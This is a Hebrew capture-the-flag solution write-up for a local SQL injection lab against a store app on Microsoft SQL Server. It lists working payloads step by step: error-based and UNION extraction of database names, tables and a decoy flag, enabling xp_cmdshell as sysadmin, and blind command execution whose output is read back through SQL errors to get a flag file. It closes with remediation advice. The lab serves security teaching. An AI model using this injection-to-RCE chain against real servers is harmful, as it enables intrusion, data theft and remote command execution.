# פתרון — SQLi With A Twist (ספוילרים)

> ⚠️ לשימוש חוקי, מקומי וחינוכי בלבד. המדריך עוקב אחרי סביבת **מסד הנתונים על Windows** (Path A ב-README), ולכן הפקודות הן של Windows (`dir`, `type`) והדגל נמצא ב-`C:\Users\Public\Flag.txt`.

**מטרה:** חיפוש המחירים — `GET http://localhost:8080/search?price=<PAYLOAD>` (תיבת החיפוש ב-`/inventory` פונה לאותו endpoint).
**למה ה-payloads נראים ככה:** הפרמטר `price` משורשר בתוך `LIKE '<price>%'`, אז כל payload נפתח ב-`'` ונסגר ב-`--`. התשובה היא טקסט רגיל: מחירים תואמים כ-CSV, או HTTP 500 שגופו הוא שגיאת ה-SQL הגולמית — השגיאה הזו היא ערוץ החילוץ.

בסיס: `?price=10` => `10,100,101,105,1000,1050`.

---

### 1. זיהוי — גרש בודד שובר את המחרוזת:

```
10'
```

=> 500 `Unclosed quotation mark after the character string...` = פגיע להזרקה.

### 2. בוליאני — אמת מול שקר (שניהם HTTP 200):

```
' OR 1=1--
```

```
' OR 1=2--
```

=> `1=1` מחזיר את כל המחירים, `1=2` מחזיר כלום.

**✅ פגיעות ראשונה: SQL Injection (סוגים שונים)**

### 3. ספירת עמודות — עמודה אחת חוזרת:

```
' UNION SELECT 1--
```

```
' UNION SELECT 1,2--
```

=> `1` עובד (200), `1,2` זורק שגיאה (`All queries ... must have an equal number of columns`) = בדיוק עמודה אחת.

### 4. מסד הנתונים הנוכחי — העמודה הנבחרת מספרית (`INT`), אז מחרוזת שנדחפת דרך `UNION` נכשלת בהמרה ומדליפה בשגיאה:

```
' UNION SELECT DB_NAME()--
```

=> 500 מדליף `StoreDb`. (זהו למעשה חילוץ **error-based** דרך שגיאת ההמרה, לא UNION קלאסי in-band.)

### 5. גרסה / DBMS:

```
' UNION SELECT @@version--
```

=> 500 מדליף למשל `Microsoft SQL Server 2022 ...` (תלוי איזו מהדורה התקנת).

**✅ פגיעות שנייה: חשיפת מידע רגיש בהודעות שגיאה**

### 6. כל מסדי הנתונים בשרת:

```
' UNION SELECT STRING_AGG(name,',') FROM sys.databases--
```

=> מדליף `master,tempdb,model,msdb,StoreDb,VaultDb` — מסד נתונים שני, `VaultDb`, יושב על אותו instance.

**✅ פגיעות שלישית: היעדר בידוד בין מסדי נתונים**

### 7. מעבר ל-`VaultDb` (אפשרי כי אנחנו sysadmin) — טבלאות, ואז עמודות טבלת `Flag`, ואז הנתונים:

```
' UNION SELECT STRING_AGG(name,',') FROM VaultDb.sys.tables--
```

```
' UNION SELECT STRING_AGG(COLUMN_NAME,',') FROM VaultDb.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Flag'--
```

```
' UNION SELECT STRING_AGG(note,',') FROM VaultDb.dbo.Flag--
```

=> מדליף `Nice try but the flag will be found with more effort`. **פיתיון** — הדגל האמיתי לא נמצא באף מסד נתונים.

---

## SQL Injection => Remote Code Execution 🏆

### 8. האם אנחנו DBA?

```
' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--
```

=> מחזיר `1`. הספרה הבודדת הזו היא ההבדל בין RCE ללא-RCE.

**✅ פגיעות רביעית: ה-login של האפליקציה חבר בתפקיד הבכיר ביותר `sysadmin`**

### 9. האם `xp_cmdshell` זמין?

```
' UNION SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'--
```

=> `0` = כבוי. אבל כ-sysadmin אפשר להדליק:

```
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

בדיקה חוזרת:

```
' UNION SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell'--
```

=> `1` = דלוק.

**✅ פגיעות חמישית: הרצת פקודות מערכת זמינה כעת על השרת**

### 10. מריצים פקודה — אבל כלום לא חוזר:

```
'; EXEC master..xp_cmdshell 'whoami';--
```

=> HTTP 200, ריק. זהו **Blind RCE**: הפקודה רצה, אבל האפליקציה מחזירה רק את ה-result set ה**ראשון** (שאילתת המחירים) וזורקת את השאר — הפלט של `xp_cmdshell` לא מגיע לתגובת ה-HTTP. צריך לנתב את הפלט חזרה דרך ערוץ שאנחנו *כן* יכולים לקרוא: הודעת השגיאה.

## The Endgame 🃏

### 11. מריצים את הפקודה ושומרים את הפלט בטבלה שבשליטתנו:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
```

### 12. קוראים את הטבלה חזרה דרך ערוץ השגיאה:

```
' UNION SELECT line FROM dbo.rce_out WHERE line IS NOT NULL--
```

=> 500 מדליף את הפלט של `whoami` (למשל `nt authority\system` או חשבון השירות של SQL).

**🏆 ממצא קריטי: SQL Injection שמוביל ל-Remote Code Execution (RCE)**

### 13. תפיסת הדגל — זכור את הרמז (`Users Public`). מציגים את התיקייה:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'dir /b C:\Users\Public';--
```

```
' UNION SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL--
```

=> תראה את `Flag.txt`. עכשיו קורא אותו:

```
'; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'type C:\Users\Public\Flag.txt';--
```

```
' UNION SELECT line FROM dbo.rce_out WHERE line IS NOT NULL--
```

=> 🚩 `This Is The KfirVerse flag - Congrats :)`

---

## סיכום — חמש חולשות ששורשרו להשפעה קריטית אחת

1. SQL Injection (סוגים שונים).
2. חשיפת מידע רגיש בהודעות שגיאה.
3. היעדר בידוד בין מסדי נתונים.
4. login של האפליקציה בתפקיד `sysadmin`.
5. הרצת פקודות מערכת (`xp_cmdshell`) זמינה.

**תוצאה:** SQL Injection => Remote Code Execution על השרת.

ההמלצות ממופות ל-OWASP WSTG ו-CWE לכל סעיף: פרמטריזציה וולידציה של קלט, החזרת שגיאות גנריות, בידוד מסדי נתונים, הרשאות מינימום ל-login, והשארת `xp_cmdshell` כבוי.
